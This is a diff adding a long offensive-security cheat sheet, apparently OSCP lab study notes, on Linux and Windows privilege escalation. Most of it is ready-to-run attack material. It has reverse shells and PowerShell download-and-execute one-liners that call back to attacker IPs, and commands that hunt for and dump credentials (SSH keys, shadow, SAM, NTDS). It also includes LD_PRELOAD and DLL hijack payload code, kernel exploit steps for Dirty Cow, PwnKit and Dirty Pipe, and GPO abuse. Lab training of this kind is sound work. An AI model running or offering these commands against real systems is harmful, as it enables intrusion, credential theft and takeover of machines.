@@ -1619,3 +1619,2492 @@ db.users.drop()
 - $where
 - $exists
 - $regex
+  
+
+
+# Miscellaneous Linux Commands
+
+```sh
+#terminal history 
+nano ~/.zsh_history
+
+#make an alias
+nano ~/.zshrc
+source ~/.zshrc 
+
+# if you know what you're looking for, you can cheat and check whether/where that option is in the wordlist you're trying with 
+grep -n <search term> <wordlist>
+
+#find out if using bash or zshell
+echo $0
+
+#open terminal in root mode
+sudo thunar
+
+#look for root processes
+ps -ef | grep root
+
+#update package 
+sudo apt upgrade crackmapexec
+
+#tar.gz
+tar -xzvf ligolo-ng_agent_0.4.4_linux_amd64.tar.gz
+
+#fix the path
+PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin
+python -c 'import pty; pty.spawn("/bin/bash")'
+PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin
+
+#nano wrapping
+esc + $
+
+#tcpdump listen for pings
+sudo tcpdump -i tun0 icmp and src host 192.168.238.146
+
+
+```
+
+To display the metadata of any _supported file_,[4](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/client-side-attacks/target-reconnaissance/information-gathering#fn4) we can use _exiftool_.[5](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/client-side-attacks/target-reconnaissance/information-gathering#fn5) Let's provide the arguments **-a** to display duplicated tags and **-u** to display unknown tags along with the filename **brochure.pdf**:
+
+```shell
+exiftool -a -u brochure.pdf 
+```
+# Reverse Shells
+
+```shell
+#upgrade
+bash -i
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+script -qc /bin/bash /dev/null
+
+#python reverse shell
+https://github.com/orestisfoufris/Reverse-Shell---Python/blob/master/reverseshell.py
+
+#socat
+#Listener:
+socat file:`tty`,raw,echo=0 tcp-listen:4444
+#Victim:
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
+```
+
+# Sensitive Files/Passwords on Linux
+
+```sh
+wget http://192.168.45.230/linuxprivesc/pspy64
+./pspy64
+
+######run alll the below with this:
+wget http://192.168.49.106/linuxprivesc/sensitiveinfo.sh && chmod +x sensitiveinfo.sh
+./sensitiveinfo.sh
+
+#find local file
+find / -type f -name "local.txt"
+
+# shell history
+cat /home/*/.*history
+grep -E 'telnet|ssh|mysql' /home/*/.*history 2>/dev/null
+
+# credential files
+ls -l /home/*/.ssh/id_*  # ssh keys
+ls -AlR /home/*/.gnupg  # PGP keys
+
+# "shadow" files usually have credentials
+find / -path '/usr' -prune -o -type f -readable \( -iname 'shadow*' -o -iname '.shadow*' \) -ls 2>/dev/null
+
+# Wordpress config, can have credentials
+find / -type f -readable -name wp-config.php -ls 2>/dev/null
+# normally at:
+/var/www/wordpress/wp-config.php
+
+find / -type f -readable -name doas.conf -ls 2>/dev/null
+
+# look for other php config files that may have creds
+find / -type f -readable -name '*config.php' -ls 2>/dev/null
+
+# Apache htaccess files might indicate files/directories with sensitive info
+find / -type f -readable -name .htaccess -ls 2>/dev/null
+
+# mysql configs, can have creds
+find / -type f -readable -name '*my.cnf' -ls 2>/dev/null
+
+# find *_history files (bash, zsh, mysql, etc.), which may have sensitive info
+find / -xdev -type f -readable -name '*_history' -ls 2>/dev/null
+
+# AWS credentials
+find / -xdev -type f -readable -path '*/.aws/*' \( -name credentials -o -name config \) -ls 2>/dev/null
+
+# Docker config, has credentials
+find / -xdev -type f -readable -path '*/.docker/*' -name config.json -ls 2>/dev/null
+
+# GNUPG directory
+find / -xdev -type d -readable -name '.gnupg' -ls 2>/dev/null
+
+# Confluence config has credentials
+find / -xdev -type f -readable -name confluence.cfg.xml -ls 2>/dev/null
+# normally at:
+/var/atlassian/application-data/confluence/confluence.cfg.xml
+
+# VNC passwd files have creds
+find / -xdev -type f -path '*/.*vnc/*' -name passwd -ls 2>/dev/null
+
+# rarely, .profile files have sensitive info
+find / -xdev -type f -readable -name '.*profile' -ls 2>/dev/null
+```
+
+Sometimes git repos contain sensitive info in the git history.
+
+```sh
+
+https://medium.com/stolabs/git-exposed-how-to-identify-and-exploit-62df3c165c37
+
+# view commit history
+git log
+
+# show changes for a commit
+git show COMMIT_HASH
+
+# search for sensitive keywords in current checkout
+git grep -i password
+
+# search for sensitive keywords in file content of entire commit history
+git grep -i password $(git rev-list --all)
+```
+
+# Automated Tools 
+
+```shell
+#linuxsmartenum
+#https://github.com/diego-treitos/linux-smart-enumeration
+wget http://192.168.49.106/linuxprivesc/lse.sh && chmod 700 lse.sh 
+./lse.sh -l1
+
+#SUIDchecker
+wget http://192.168.49.106/linuxprivesc/suid3num.py --no-check-certificate && chmod 777 suid3num.py
+#or 3
+python3 suid3num.py
+
+#linpeas
+wget http://192.168.49.106/linuxprivesc/linpeas && chmod 700 linpeas
+./linpeas
+# -D for debug 
+# Output to file
+./linpeas -a > /dev/shm/linpeas.txt #Victim
+less -r /dev/shm/linpeas.txt #Read with colors
+
+
+```
+
+# Linux Privilege Escalation
+
+### Easy Fruit
+
+```sh
+
+# from 1.8.2 to 1.8.31p2 and all stable versions from 1.9.0 to 1.9.5p1.
+# Exploit works even if user isn't in sudoers file.
+sudoedit -s /
+# Vulnerable if it says 'sudoedit: /: not a regular file' instead of 'usage:...'
+# use exploit: https://github.com/CptGibbon/CVE-2021-3156.git
+
+# check sudo version
+sudo -V
+# [Sudo-1.8.31-Root-Exploit]
+# if older than 1.8.28, root privesc:
+sudo -u#-1 /bin/bash
+# or sudo -u \#$((0xffffffff)) /bin/bash
+
+```
+
+### Adding root user to /etc/shadow or /etc/passwd
+
+```sh
+# if /etc/shadow is writable
+# generate new password
+openssl passwd -6 pwned
+# or
+mkpasswd -m sha-512 pwned
+# edit /etc/shadow and overwrite hash of root with this one
+
+# if /etc/passwd is writable
+echo 'pwned:$(openssl passwd -6 pwned):0:0:root:/root:/bin/bash' >> /etc/passwd
+# alternatively
+echo 'derp:$(mkpasswd -m sha-512 herpderp):0:0:root:/root:/bin/bash' >> /etc/passwd
+
+# the empty/blank crypt hash for old Linux systems is U6aMy0wojraho.
+# if you see this in an /etc/passwd (or shadow), the user has no password!
+
+```
+
+### Abusing `sudo`
+
+
+> ⚠ **NOTE**: If you get "Permission denied" error, check `/var/log/syslog` to see if the `audit` daemon is blocking you with `AppArmor` (enabled by default on Debian 10).
+
+```sh
+# check for sudo permissions
+sudo -l
+# if you see a binary with '(root) NOPASSWD ...' you might be in luck
+# check the following website for escalation methods:
+# https://gtfobins.github.io/#+sudo
+
+# Example: awk
+sudo awk 'BEGIN {system("/bin/sh")}'
+
+# Example: find
+sudo find . -exec /bin/sh \; -quit
+```
+
+**Grant passwordless sudo access**
+
+Edit the `/etc/sudoers` file to have the following line:
+
+```
+myuser ALL=(ALL) NOPASSWD: ALL
+```
+
+
+**(sudo -l) LD_PRELOAD and LD_LIBRARY_PATH**
+
+For this to work, `sudo -l` must show that either LD_PRELOAD or LD_LIBRARY_PATH
+are inherited from the user's environment:
+```
+env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
+```
+
+`preload.c`:
+```c
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+#define _GNU_SOURCE
+#include <unistd.h>
+
+void _init() {
+	unsetenv("LD_PRELOAD");
+	// setresuid(0,0,0);
+  setuid(0);
+  setgid(0);
+	system("/bin/bash -p");
+  exit(0);
+}
+```
+
+`library_path.c`:
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+static void hijack() __attribute__((constructor));
+
+void hijack() {
+	unsetenv("LD_LIBRARY_PATH");
+	setresuid(0,0,0);
+	system("/bin/bash -p");
+  exit(0);
+}
+```
+
+Usage:
+
+```sh
+# LD_PRELOAD
+# compile malicious preload binary
+gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
+# use it to get root
+sudo LD_PRELOAD=/tmp/preload.so program_name_here
+
+# LD_LIBRARY_PATH
+# see which shared libraries are used
+ldd $(which apache2)
+# compile malicious library as one of existing ones
+gcc -o /tmp/libcrypt.so.1 -shared -fPIC library_path.c
+# use it to get root
+sudo LD_LIBRARY_PATH=/tmp apache2
+# note, some ld-files work better than others, so try every option from ldd
+# if the first attempt fails. May also need to alter file to hook function
+# being called (must exactly match function signature)
+```
+
+
+### Abusing Setuid Binaries and Capabilities
+
+```sh
+# find all root-owned SUID and GUID binaries
+find / -type f \( -perm -g+s -a -gid 0 \) -o \( -perm -u+s -a -uid 0 \) -ls 2>/dev/null
+#Then use GTFObins to determine how to abuse. 
+
+#find capabalities and look for setuid+ep
+/usr/sbin/getcap -r / 2>/dev/null
+
+```
+
+### Cron Jobs/scheduled tasks 
+
+```shell
+#find jobs look for which my user has write access to 
+ls -lah /etc/cron*
+
+#also do
+less /etc/crontab
+
+#look at all cron jobs in syslog
+grep "CRON" /var/log/syslog
+
+```
+
+### Using NFS for Privilege Escalation
+
+NFS Shares inherit the **remote** user ID, so if root-squashing is disabled,
+something owned by root remotely is owned by root locally.
+
+```sh
+# check for NFS with root-squashing disabled (no_root_squash)
+cat /etc/exports
+
+# On Kali box:
+sudo su   # switch to root
+mkdir /tmp/nfs
+mount -o rw,nolock,vers=2 $VICTIM_IP:/share_name /tmp/nfs
+# Note: if mount fails, try without vers=2 option.
+msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
+chmod +xs /tmp/nfs/shell.elf
+
+# on victim machine
+/tmp/shell.elf
+```
+
+### Using Docker for Privesc
+
+GTFOBIN
+
+### Linux Kernel Exploits
+
+⚠ **NOTE**: Use LinPEAS to enumerate for kernel vulnerabilities. 
+
+#### Dirty Cow
+
+[CVE-2016-5195](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2016-5195) is effective against Linux kernels 2.x through 4.x before 4.8.3.
+
+```sh
+# easiest if g++ avail
+searchsploit -m 40847
+g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
+./dcow -s
+
+# Also good:
+searchsploit -m 40839
+
+# make dirtycow stable
+echo 0 > /proc/sys/vm/dirty_writeback_centisecs
+```
+
+
+#### PwnKit
+
+[CVE-2021-4034](https://nvd.nist.gov/vuln/detail/cve-2021-4034) PwnKit is effective against many Linux variants:
+- Ubuntu 10 - Ubuntu 21.10
+- Debian 7 - Debian 11
+- RedHat 6.0 - RedHat 8.4 (and similar Fedora & CentOS versions?)
+
+Affects pkexec (polkit) < 0.120.
+
+**Detailed vulnerable versions:**  [reference](https://www.datadoghq.com/blog/pwnkit-vulnerability-overview-and-remediation/)
+
+Check what's installed with `dpkg -s policykit-1`
+
+Ubuntu:
+
+| Ubuntu version     | Latest vulnerable version | First fixed version         |
+| ------------------ | ------------------------- | --------------------------- |
+| 14.04 LTS (Trusty) | 0.105-4ubuntu3.14.04.6    | 0.105-4ubuntu3.14.04.6+esm1 |
+| 16.04 LTS (Xenial) | 0.105-14.1ubuntu0.5       | 0.105-14.1ubuntu0.5+esm1    |
+| 18.04 LTS (Bionic) | 0.105-20                  | 0.105-20ubuntu0.18.04.6     |
+| 20.04 LTS (Focal)  | 0.105-26ubuntu1.1         | 0.105-26ubuntu1.2           |
+
+Debian:
+
+| Debian version | Latest vulnerable version | First fixed version |
+| -------------- | ------------------------- | ------------------- |
+| Stretch        | 0.105-18+deb9u1           | 0.105-18+deb9u2     |
+| Buster         | 0.105-25                  | 0.105-25+deb10u1    |
+| Bullseye       | 0.105-31                  | 0.105-31+deb11u1    |
+| (unstable)     | 0.105-31.1~deb12u1        | 0.105-31.1          |
+
+Checking for vulnerability:
+
+```sh
+# check suid bit set:
+ls -l /usr/bin/pkexec
+
+# check for vulnerable version (see above tables):
+dpkg -s policykit-1
+```
+
+Exploit:
+
+```sh
+wget http://192.168.45.230/linuxprivesc/PwnKit
+chmod +x ./PwnKit
+./pwnkit # interactive shell
+./PwnKit 'id' # single command
+# it will tell you nicely if the exploit fails when the system is patched.
+```
+
+
+#### 6.2.8.3 Get-Rekt BPF Sign Extension LPE
+
+[CVE-2017-16995](https://nvd.nist.gov/vuln/detail/CVE-2017-16995) is effective against Linux kernel 4.4.0 - 4.14.10.
+- Debian 9
+- Ubuntu 14.04 - 16.04
+- Mint 17 - 18
+- Fedora 25 - 27
+
+```sh
+# on kali, grab source
+searchsploit -m 45010
+python -m http.server 80
+
+# on victim, download, compile, and execute
+wget LISTEN_IP/45010.c -O cve-2017-16995
+gcc cve-2017-16995.c -o cve-2017-16995
+```
+
+
+#### Dirty Pipe 5.8 + 
+
+[CVE-2022-0847](https://nvd.nist.gov/vuln/detail/CVE-2022-0847) affects Linux kernels 5.8.x up. The vulnerability was fixed in Linux 5.16.11, 5.15.25 and 5.10.102.
+- Ubuntu 20.04 - 21.04
+- Debian 11
+- RHEL 8.0 - 8.4
+- Fedora 35
+
+```sh
+wget https://raw.githubusercontent.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/main/exploit.c
+python -m http.server 80
+
+# on victim
+wget LISTEN_IP/exploit.c
+gcc exploit.c -o exploit # may need to compile locally with "-static"
+./exploit # if statically compiled, may complain about system() failing, but might be ok
+
+# check if exploit worked
+grep root /etc/passwd # should see hash with 'aaron' salt
+
+# become r00t
+su - # use password 'aaron'
+
+# to restore to pre-exploit state
+# if you get error "su: must be run from a terminal"
+# or error "system() function call seems to have failed :("
+# but the exploit successfully changed root's password in /etc/passwd
+# - login as root with the password aaron.
+# - restore /etc/passwd
+mv /tmp/passwd.bak /etc/passwd
+```
+
+
+
+## Miscellaneous Windows Commands
+
+cmd.exe:
+
+```shell
+# certutil download with NT SYSTEM
+certutil -urlcache -split -f http://192.168.45.155/windowsprivesc/reverse.exe reverse.exe
+
+# Download using expand
+expand http://192.168.45.230/windowsprivesc/ test.text
+# Download from SBM share into Alternate Data Stream
+expand \\badguy\evil.exe C:\Users\Public\somefile.txt:evil_ads.exe
+
+#32 or 64 bits
+wmic os get osarchitecture
+
+#net version 
+reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"
+
+#osinfo
+systeminfo
+
+#fix the PATH to execute commands
+set PATH=%SystemRoot%\system32;%SystemRoot%;
+
+```
+
+PowerShell:
+
+```powershell
+
+####################################
+########### DOWNLOADS ##############
+####################################
+
+#download a file and run it instantly
+IEX(IWR http://192.168.45.193/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell
+
+#get all content from iwr request
+Invoke-WebRequest -UseDefaultCredentials -Uri http://web04 | Select-Object -Expand content
+
+# uploading a file:
+(New-Object System.Net.WebClient).UploadFile('http://LISTEN_IP/upload.php','somefiile')
+
+####################################
+########### USERS ##################
+####################################
+
+# Run as a different user 
+runas /user:username cmd
+
+# powershell way change password with generic all
+Set-ADAccountPassword -Identity someuser -OldPassword (ConvertTo-SecureString -AsPlainText "p@ssw0rd" -Force) -NewPassword (ConvertTo-SecureString -AsPlainText "qwert@12345" -Force)
+
+# check account policy's password lockout threshold
+net accounts
+
+#Add to a group
+net group "Management Department" stephanie /add /domain
+
+#find all service users
+Get-WmiObject -Query "SELECT * FROM Win32_Service" | ForEach-Object { $_.StartName }
+
+#elevate to system
+psexec -i -s cmd.exe
+
+####################################
+############## OS ##################
+####################################
+
+#enable scripts with psremote
+Set-ExecutionPolicy RemoteSigned
+
+# determine if OS is 64-bit (various methods)
+[System.Environment]::Is64BitOperatingSystem
+(Get-WMIObject Win32_OperatingSystem).OSArchitecture
+
+#Get operating system info
+Get-WmiObject Win32_OperatingSystem | Select-Object Caption, Version, BuildNumber, ServicePackMajorVersion, Manufacturer
+Get-ComputerInfo | Select-Object OsName, OsVersion, OsBuildNumber, OsServicePack
+
+#GET NET class version
+$PSVersionTable.CLRVersion
+
+####################################
+########### PROCESSES ##############
+####################################
+
+#Get process ID of process
+Get-Process NonStandardProcess | %{$_.name; $_.ID}
+
+#find path of process ID
+Get-Process -Id 8036 -FileVersionInfo | Select FileName
+
+#find if ssh exists
+if (Test-Path (Get-Command ssh.exe -ErrorAction SilentlyContinue).Source) { Write-Host "ssh.exe exists." } else { Write-Host "ssh.exe does not exist." }
+
+#find if service exists
+Get-Service -Name "AdminTool" -ErrorAction SilentlyContinue
+
+#find if service restartable 
+(Get-Service -Name "auditTracker").StartType -eq "Automatic"
+
+####################################
+########### NETWORK ################
+####################################
+
+#find if a port is listening
+netstat -anp TCP | find "2222"
+netsh interface portproxy show all
+
+```
+
+## SMB Share
+
+```shell
+#xfreerdp
+freerdp +clipboard /u:offsec /p:'Th3R@tC@tch3r' /dynamic-resolution /cert-ignore /drive:test,/home/kali/offsec/upload /v:192.168.191.250 
+
+#start smb server, connect with \\ip\smbfolder
+impacket-smbserver smbfolder $(pwd) -smb2support -username test -password test
+
+#mount the drive in powershell 
+$pass = ConvertTo-SecureString 'test' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('test', $pass)
+
+New-PSdrive -Name kali -PSProvider FileSystem -Credential $cred -Root \\192.168.49.106\smbfolder
+
+#Transfer the file
+# Windows to Kali
+copy C:\Users\jim\Documents\Database.kdbx \\192.168.45.230\smbfolder\ 
+#Kali to Windows
+copy \\192.168.45.193\smbfolder\seatbelt.exe C:\temp\
+```
+
+## SSH transfers
+
+```ssh
+
+scp ariah@192.168.x.x:C:/ftp/Infrastructure.pdf . 
+
+scp administrator@192.168.190.141:C:/users/public/oscp.exam_ . 
+
+```
+## Reverse Shells
+
+**Con Pty shell**
+
+```shell
+#server
+stty raw -echo; (stty size; cat) | rlwrap nc -lvnp 22
+
+#reset it after
+stty sane
+
+#client
+
+powershell IEX(IWR http://192.168.45.185/windowsprivesc/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.49.106 22
+
+```
+
+**Powercat**
+
+```powershell
+powershell Invoke-WebRequest -Uri 192.168.49.106/windowsprivesc/powercat.ps1 -OutFile powercat.ps1
+
+powershell IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.49.106/windowsprivesc/powercat.ps1");powercat -c 192.168.49.106 -p 22 -e powershell
+
+.\powercat.ps1 powercat -c 192.168.49.106 -p 22 -e powershell
+
+```
+
+**Netcat**
+
+```shell
+Invoke-WebRequest -Uri 192.168.49.106/windowsprivesc/nc.exe -OutFile nc.exe 
+
+.\nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.49.106 445
+
+```
+
+**base64**
+
+If you convert to base64 on Linux for execution with `powershell -enc "BASE64ENCODEDCMD"`, use the following command to ensure you don't mess up the UTF-16LE encoding that Windows uses:
+
+```sh
+# base64-encoding custom powershell 1-liner
+echo 'IEX(IWR http://192.168.45.230/windowsprivesc/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.45.230 3001' | iconv -t UTF-16LE | base64 | tr -d '\n'; echo
+
+# msfvenom version
+msfvenom -p cmd/windows/powershell_reverse_tcp -f raw lport=445 lhost=tun0 | iconv -t UTF-16LE | base64 | tr -d '\n'; echo
+```
+
+# Priv ESC
+
+### Automated
+
+
+``` shell
+#for color 
+REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
+
+#privescheck~~~~~~
+Invoke-WebRequest -Uri 192.168.49.106/windowsprivesc/PrivescCheck.ps1 -OutFile PrivescCheck.ps1
+~~
+certutil -urlcache -split -f http://192.168.49.106/windowsprivesc/PrivescCheck.ps1 privesccheck2.ps1
+~~
+powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck" -Report PrivescCheck -Format TXT
+https://github.com/itm4n/PrivescCheck
+
+#JAWS~~~~
+Invoke-WebRequest -Uri 192.168.49.106/windowsprivesc/jaws-enum.ps1 -OutFile jaws-enum.ps1
+
+powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1
+
+#winpeas~~~~
+
+Invoke-WebRequest -Uri 192.168.49.106/windowsprivesc/winPEASx64.exe -OutFile winpeas.exe
+certutil -urlcache -split -f http://192.168.45.230/windowsprivesc/winPEASx64.exe winpeas.exe
+~~~
+.\winpeas.exe -ErrorAction SilentlyContinue
+
+```
+
+ Using Powersploit
+
+```powershell
+smbshare..
+
+C:\Windows\system32\WindowsPowerShell\v1.0\Modules\ 
+Copy-Item -Path "powersploit" -Destination "C:\Windows\system32\WindowsPowerShell\v1.0\Modules\" -Recurse
+Import-Module .\powersploit
+Import-Module C:\Windows\system32\WindowsPowerShell\v1.0\Modules\powersploit\PowerSploit.psd1
+
+Get-UnattendedInstallFile
+Get-Webconfig
+Get-ApplicationHost
+
+```
+
+### Scheduled Tasks 
+
+```powershell
+#See a list of scheduled task look for the next and last run time + then run as user and task to run
+schtasks /query /fo LIST /v 
+
+#create a sched task
+schtasks /create /tn "reverse" /sc minute /mo 1 /tr "C:\Users\adrian\reverse.exe"
+
+.\godpotato.exe -cmd 'schtasks /create /tn "reverse" /sc minute /mo 1 /tr "C:\Users\adrian\reverse.exe" /ru "SID S-1-5-21-464543310-226837244-3834982083-500"'
+
+#looking for F or write permissions
+icacls [task to run]
+#then upload the executable that can add a user we can control
+```
+
+### Service Hijacking
+
+```powershell
+# List of services with binary path
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+
+#permissions of path
+icacls "C:\xampp\mysql\bin\mysqld.exe"
+
+#rplacing the binary
+move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
+move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
+
+net stop ServiceName
+net start ServiceName
+
+#find if service restartable 
+(Get-Service -Name "auditTracker").StartType -eq "Automatic"
+
+#if not restartable
+shutdown /r /t 0
+
+#automate with powerup, but best to manually review the service ourself with icalcs
+powershell -ep bypass
+. .\PowerUp.ps1
+Get-ModifiableServiceFile
+Install-ServiceBinary -Name 'mysql'
+
+```
+
+### Unquoted service paths
+
+```
+C:\Program Files\My Program\My service\service.exe
+
+C:\Program.exe
+C:\Program Files\My.exe
+C:\Program Files\My Program\My.exe
+
+
+
+```
+
+```powershell
+#list of services with binary path
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName
+
+C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
+icacls "C:\"
+icacls "C:\Program Files"
+..
+
+copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
+
+Start-Service  GammaService
+
+#powerup
+. .\PowerUp.ps1
+Get-UnquotedService
+```
+
+## Service DLL Hijack
+
+First, identify why the service does not work by transferring it to windows and using procmon. 
+
+```powershell
+
+sc.exe create "scheduler" binpath= "C:\Users\offsec\Desktop\scheduler.exe"
+
+restart-service scheduler
+
+##PROCMON CTL + L for filter path dll and "FOUND"
+
+#create the dll and place in folder
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.230 LPORT=3000 -f dll -o beyondhelper.dll
+
+
+```
+
+## GPO
+
+We can check what permissions we have on a specific GPO by passing its GUID (labeled "name") to the cmdlet `Get-GPPermission`. Let's check our permissions on the **Default Group Policy**.
+
+```
+*Evil-WinRM* PS C:\Users\anirudh\Documents> Get-GPPermission -Guid 31B2F340-016D-11D2-945F-00C04FB984F9 -TargetType User -TargetName anirudh
+
+
+Trustee     : anirudh
+TrusteeType : User
+Permission  : GpoEditDeleteModifySecurity
+Inherited   : False
+```
+
+The entry labeled `Permission` shows that we have the ability to edit, delete, and modify this policy. We can take advantage of this misconfiguration by using a tool named `SharpGPOAbuse`.
+
+GPO Abuse via SharpGPOAbuse
+
+Let's download a copy of the pre-complied executable from https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.0_x64/SharpGPOAbuse.exe to our Kali host.
+
+```
+┌──(kali㉿kali)-[~]
+└─$ wget https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.0_x64/SharpGPOAbuse.exe
+--2021-11-19 15:27:15--  https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.0_x64/SharpGPOAbuse.exe
+...
+
+2021-11-19 15:27:16 (3.70 MB/s) - ‘SharpGPOAbuse.exe’ saved [70656/70656]
+```
+
+Back in our `evil-winrm` shell, we'll upload the executable using the `upload` command.
+
+```
+*Evil-WinRM* PS C:\Users\anirudh\Documents> upload /home/kali/SharpGPOAbuse.exe
+Info: Uploading /home/kali/SharpGPOAbuse.exe to C:\Users\anirudh\Documents\SharpGPOAbuse.exe
+
+                                                             
+Data: 94208 bytes of 94208 bytes copied
+
+Info: Upload successful!
+
+*Evil-WinRM* PS C:\Users\anirudh\Documents> 
+```
+
+We can now execute **SharpGPOAbuse.exe** specifying that we want to add our user account to the local Administrators group, passing our username, and passing the group policy we have write access to.
+
+```
+*Evil-WinRM* PS C:\Users\anirudh\Documents> ./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy"
+[+] Domain = vault.offsec
+[+] Domain Controller = DC.vault.offsec
+[+] Distinguished Name = CN=Policies,CN=System,DC=vault,DC=offsec
+[+] SID Value of anirudh = S-1-5-21-537427935-490066102-1511301751-1103
+[+] GUID of "Default Domain Policy" is: {31B2F340-016D-11D2-945F-00C04FB984F9}
+[+] File exists: \\vault.offsec\SysVol\vault.offsec\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
+[+] The GPO does not specify any group memberships.
+[+] versionNumber attribute changed successfully
+[+] The version number in GPT.ini was increased successfully.
+[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
+[+] Done!
+*Evil-WinRM* PS C:\Users\anirudh\Documents> 
+```
+
+With that done, we'll need to update the local Group Policy.
+
+```
+*Evil-WinRM* PS C:\Users\anirudh\Documents> gpupdate /force
+Updating policy...
+
+
+
+Computer Policy update has completed successfully.
+
+User Policy update has completed successfully.
+```
+
+We can verify that this worked by checking the members of the local Administrators group.
+# Scanning New Network 
+
+Once we have discovered a new network and internal machine:
+
+```shell
+
+#Check which computers we have access to 
+crackmapexec smb 172.16.238.0/24 -u joe -p Flowers1 --continue-on-success 
+crackmapexec smb 172.16.237.83 -u support -H 00000000000000000000000000000000:d9358122015c5b159574a88b3c0d2071 --local-auth
+
+crackmapexec winrm 10.10.99.0/24 -u  celia.almeda -H aad3b435b51404eeaad3b435b51404ee:e728ecbadfb02f51ce8eed753f3ff3fd
+
+#aseproast for quick hashes 
+impacket-GetNPUsers -dc-ip 172.16.93.6  -request -outputfile hashes.asreproast oscp.exam/jim
+
+```
+
+# Windows Passwords & Hashes
+
+##  Windows Passwords in Files
+
+To decrypt the Groups.xml password: `gpp-decrypt encryptedpassword`
+
+```powershell
+
+#mimikittenz
+Invoke-WebRequest -Uri 192.168.49.106/windowsprivesc/Invoke-mimikittenz.ps1 -OutFile Invoke-mimikittenz.ps1
+import-module .\Invoke-mimikittenz.ps1
+Invoke-Mimikittenz
+
+#seatbelt
+Invoke-WebRequest -Uri 192.168.49.106/windowsprivesc/Seatbelt.exe -OutFile seatbelt.exe
+.\seatbelt.exe -group=user
+
+# anything in env?
+Get-ChildItem Env:
+
+#get history 
+type (Get-PSReadlineOption).HistorySavePath
+
+ls C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+#find file 
+Get-ChildItem -Path C:\ -Include local.txt -File -Recurse -ErrorAction SilentlyContinue
+dir C:\Users\local.txt /s /b
+
+# User files that may have juicy data
+powershell -c "Get-ChildItem -Path C:\Users\ -Exclude Desktop.ini -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.gpg,*.kdbx,*.ini,*.pst,*.ost,*.eml,*.msg,*.log,id_* -File -Recurse -ErrorAction SilentlyContinue"
+
+# files with juicy info
+dir /a-d /s/b C:\users | findstr /ilvC:\AppData\ /C:\desktop.ini /C:\ntuser.dat /C:"\All Users\VMware" /C:"\All Users\USOShared" /C:"\All Users\Package" /C:"\All Users\Microsoft"
+
+# FileZilla config:
+# look for admin creds in FileZilla Server.xml
+dir /s/b C:\FileZilla*.xml
+type "FileZilla Server.xml" | findstr /spin /c:admin
+type "FileZilla Server Interface.xml" | findstr /spin /c:admin
+
+# Unattend install files: plaintext or base64 encoded password
+cat C:\unattend.xml
+cat C:\Windows\Panther\Unattend.xml
+cat C:\Windows\Panther\Unattend\Unattend.xml
+cat C:\Windows\system32\sysprep.inf
+cat C:\Windows\system32\sysprep\sysprep.xml
+
+# IIS, web.config can contain admin creds
+cat C:\inetpub\wwwroot\web.config
+cat C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
+
+# SNMP credentials
+reg query HKLM\SYSTEM\Current\ControlSet\Services\SNMP
+
+# Putty proxy creds
+reg query HKCU\Software\SimonTatham\PuTTY\Sessions
+
+# Search registry for password
+reg query HKCU /f password /t REG_SZ /s
+
+#powersploit
+Get-UnattendedInstallFile
+Get-Webconfig
+Get-ApplicationHost
+
+```
+
+## SAM Database 
+
+```shell
+
+#Look for SAM and SYSTEM files in windows.old or windows -  system 32
+powershell -c "Get-ChildItem -Path C:\ -Exclude Desktop.ini -Include SAM -File -Recurse -ErrorAction SilentlyContinue"
+
+reg save hklm\system system
+reg save hklm\sam sam
+
+#crack it
+samdump2 system sam
+#if the hashes are null password
+impacket-secretsdump -sam SAM -system SYSTEM LOCAL 
+
+```
+## Hashes and Passwords Using Crackmapexec
+
+Probably the easiest way to grab all the hashes from a box once you have admin creds or an admin hash:
+
+```sh
+# dump SAM (using PtH)
+crackmapexec smb VICTIM -u Administrator -H NTHASH --local-auth --sam
+
+# dump LSA
+crackmapexec smb VICTIM -u Administrator -p PASSWORD --local-auth --lsa
+
+# dump NTDS.dit
+crackmapexec smb VICTIM_DC -u DOMAIN_ADMIN -H NTHASH --ntds
+```
+
+##  Grab NTLMv2 Hashes Using Responder
+
